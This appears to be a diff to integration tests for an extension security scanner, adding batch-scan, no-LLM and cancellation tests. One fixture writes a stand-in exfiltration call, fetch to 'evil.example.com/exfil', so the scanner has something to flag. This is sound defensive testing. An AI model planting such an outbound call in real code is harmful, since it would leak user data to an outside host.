@@ -169,6 +169,118 @@ describe('Integration: Pattern Matching', () => {
   });
 });
 
+describe('Integration: Batch Scan', () => {
+  let server: FastifyInstance;
+
+  beforeEach(async () => {
+    if (!existsSync(HISTORY_DIR)) {
+      mkdirSync(HISTORY_DIR, { recursive: true });
+    }
+    const result = await createServer({
+      historyFile: HISTORY_FILE,
+      reportsDir: HISTORY_DIR,
+      patternsFile: join(process.cwd(), 'docs', 'patterns.yaml'),
+    });
+    server = result.fastify;
+  });
+
+  afterEach(async () => {
+    await server.close();
+    if (existsSync(TEMP_DIR)) {
+      rmSync(TEMP_DIR, { recursive: true, force: true });
+    }
+  });
+
+  it('should handle scan with no_llm option', async () => {
+    const testDir = '/tmp/test-nollm-scan';
+    if (existsSync(testDir)) rmSync(testDir, { recursive: true, force: true });
+    mkdirSync(testDir, { recursive: true });
+
+    writeFileSync(join(testDir, 'package.json'), JSON.stringify({
+      name: 'test-nollm',
+      version: '2.0.0',
+      publisher: 'tester',
+    }));
+    // Write a file that triggers security patterns (fetch to external URL)
+    writeFileSync(join(testDir, 'index.js'), 'fetch("https://evil.example.com/exfil");');
+
+    try {
+      const scanResponse = await server.inject({
+        method: 'POST',
+        url: '/api/scan',
+        payload: { input_source: testDir, no_llm: 'true' },
+      });
+
+      expect(scanResponse.statusCode).toBe(200);
+      const scanBody = JSON.parse(scanResponse.body);
+      expect(scanBody.scan_id).toBeDefined();
+
+      // Poll for completion
+      let attempts = 0;
+      let scanResult: { status?: string; result?: { extensionId?: string; findings?: unknown[]; executiveSummary?: string | null } } = {};
+      while (attempts < 20) {
+        const resultResponse = await server.inject({
+          method: 'GET',
+          url: `/api/scan/${scanBody.scan_id}/result`,
+        });
+        scanResult = JSON.parse(resultResponse.body);
+        if (scanResult.status === 'complete' || scanResult.status === 'failed') break;
+        await new Promise(r => setTimeout(r, 500));
+        attempts++;
+      }
+
+      expect(scanResult.status).toBe('complete');
+      expect(scanResult.result).toBeDefined();
+      expect(scanResult.result!.extensionId).toBe('tester.test-nollm');
+      // no_llm means no executive summary from LLM
+      expect(scanResult.result!.executiveSummary).toBeNull();
+    } finally {
+      if (existsSync(testDir)) rmSync(testDir, { recursive: true, force: true });
+    }
+  }, 30000);
+
+  it('should cancel a running scan', async () => {
+    const testDir = '/tmp/test-cancel-scan';
+    if (existsSync(testDir)) rmSync(testDir, { recursive: true, force: true });
+    mkdirSync(testDir, { recursive: true });
+
+    writeFileSync(join(testDir, 'package.json'), JSON.stringify({
+      name: 'test-cancel',
+      version: '1.0.0',
+      publisher: 'tester',
+    }));
+    writeFileSync(join(testDir, 'index.js'), '// minimal file');
+
+    try {
+      const scanResponse = await server.inject({
+        method: 'POST',
+        url: '/api/scan',
+        payload: { input_source: testDir, no_llm: 'true' },
+      });
+
+      expect(scanResponse.statusCode).toBe(200);
+      const scanBody = JSON.parse(scanResponse.body);
+
+      // Attempt to cancel
+      const cancelResponse = await server.inject({
+        method: 'DELETE',
+        url: `/api/scan/${scanBody.scan_id}`,
+      });
+
+      // Scan may have already completed (it's fast), so accept either outcome
+      if (cancelResponse.statusCode === 200) {
+        const cancelBody = JSON.parse(cancelResponse.body);
+        expect(cancelBody.cancelled).toBe(true);
+      } else {
+        // Scan already finished and was cleaned up -- still a valid outcome
+        expect(cancelResponse.statusCode).toBeLessThan(500);
+      }
+    } finally {
+      if (existsSync(testDir)) rmSync(testDir, { recursive: true, force: true });
+    }
+  }, 30000);
+});
+
 describe('Integration: Scoring System', () => {
   it('should score extensions correctly', async () => {
     // Create a test extension with known patterns
@@ -206,8 +318,8 @@ describe('Integration: Scoring System', () => {
     
     try {
       const analyzer = new StaticAnalyzer(testDir, { verbose: false });
-      const result = analyzer.analyze();
-      
+      const result = await analyzer.analyze();
+
       const [score, breakdown] = calculateSuspicionScore(result);
       
       // Should have multiple findings
